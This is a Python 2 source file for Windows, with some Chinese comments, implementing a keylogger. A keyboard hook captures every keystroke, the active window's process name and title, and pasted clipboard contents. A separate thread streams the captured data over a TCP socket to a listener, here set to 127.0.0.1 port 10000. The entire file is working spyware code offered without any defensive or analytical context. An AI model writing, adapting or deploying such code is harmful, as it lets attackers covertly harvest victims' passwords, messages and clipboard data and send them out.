# -*- coding: utf-8 -*- #
from Queue import Queue  
import threading  
import time  
from ctypes import *
import pythoncom
import pyHook 
import win32clipboard
import socket
import sys


  
  
class Keylogger(threading.Thread):  
  
    def __init__(self, t_name, queue):  
  
        threading.Thread.__init__(self, name=t_name)  
        self.data     = queue  
        self.user32   = windll.user32
        self.kernel32 = windll.kernel32
        self.psapi    = windll.psapi
        self.current_window = None

    def get_current_process(self):
        hwnd = self.user32.GetForegroundWindow()

        # find the process IDFile
        pid = c_ulong(0)
        self.user32.GetWindowThreadProcessId(hwnd, byref(pid))

        # store the current process ID
        process_id = "%d" % pid.value

        # grab the executable
        executable = create_string_buffer("\x00" * 512)
        h_process = self.kernel32.OpenProcess(0x400 | 0x10, False, pid)
        self.psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)

        # now read it's title
        window_title = create_string_buffer("\x00" * 512)
        self.user32.GetWindowTextA(hwnd, byref(window_title),512)

        # print out the header if we're in the right process
        #print "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value)
        self.data.put("[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value))
        print self.data
        # close handle
        self.kernel32.CloseHandle(hwnd)
        self.kernel32.CloseHandle(h_process)
        
    def KeyStroke(self,event): 
        # check to see if target changed windows
        if event.WindowName != self.current_window:
            self.current_window = event.WindowName
            self.get_current_process()

        # if they pressed a standard key
        if event.Ascii > 32 and event.Ascii < 127:
            print chr(event.Ascii),
            self.data.put(chr(event.Ascii))
        else:
            # if [Ctrl-V], get the value on the clipboard
            if event.Key == "V":
                win32clipboard.OpenClipboard()
                pasted_value = win32clipboard.GetClipboardData()#获取剪贴板内容
                win32clipboard.CloseClipboard()
                print "[PASTE] - %s" % (pasted_value),
                self.data.put("[PASTE] - %s" % (pasted_value))
            else:
                print "[%s]" % event.Key,
                self.data.put("[%s]" % (event.Key))
        # pass execution to next hook registered 
        return True
    def run(self):  
        # create and register a hook manager 
        kl         = pyHook.HookManager()# 创建一个“钩子”管理对象
        kl.KeyDown = self.KeyStroke# 监听所有键盘事件

        # register the hook and execute forever
        kl.HookKeyboard()# 设置键盘“钩子”
        pythoncom.PumpMessages()# 进入循环，如不手动关闭，程序将一直处于监听状态

  
        # for i in range(100):  
  
        #     print "%s: %s is producing %d to the queue!\n" %(time.ctime(), self.getName(), i)  
  
        #     self.data.put(i)  
  
        #     #time.sleep(random.randrange(10)/5)  
  
        # print "%s: %s finished!" %(time.ctime(), self.getName())  
  
   
  
  
class Commuction(threading.Thread):  
  
    def __init__(self, t_name, queue):  
        threading.Thread.__init__(self, name=t_name)  
        self.data=queue 
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_address= ('127.0.0.1',10000)
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #print sys.stderr, 'connecting to %s port %s' % server_address
        self.s.connect(self.server_address) 

    def run(self):  
        print "connect"
        global message
        while True: 
            message = self.data.get()
            print message
            self.s.send(message)
            print "send"
        #self.s.send(time.ctime(), self.getName())
        #print  "%s: %s is run. %s send!\n" %(time.ctime(), self.getName(), message)  

    # Read responses on both sockets
    # for s in socks:
    #     print 0000
    #     data = s.recv(1024)
    #     print sys.stderr, '%s: received"%s"' % (s.getsockname(), data)
        # if not data:
        # for i in range(100):  
        #     val = self.data.get()  
  
        #     print "%s: %s is consuming. %d in the queue is consumed!\n" %(time.ctime(), self.getName(), val)  
  
        #     #time.sleep(random.randrange(10))  
  
        # print "%s: %s finished!" %(time.ctime(), self.getName())  
  
   
  
#Main thread  
  
def main():  
    # s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # server_address= ('127.0.0.1',10000)
    # s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #     #print sys.stderr, 'connecting to %s port %s' % server_address
    # s.connect(server_address)
   
  
    queue = Queue()  
  
    producer = Keylogger('Key.', queue)  
  
    consumer = Commuction('Com.', queue)  
  
    producer.start()  
  
    consumer.start()  
  
    producer.join()  
  
    consumer.join()  
  
    print 'All threads terminate!'  
  
  
if __name__ == '__main__':  
  
    main()  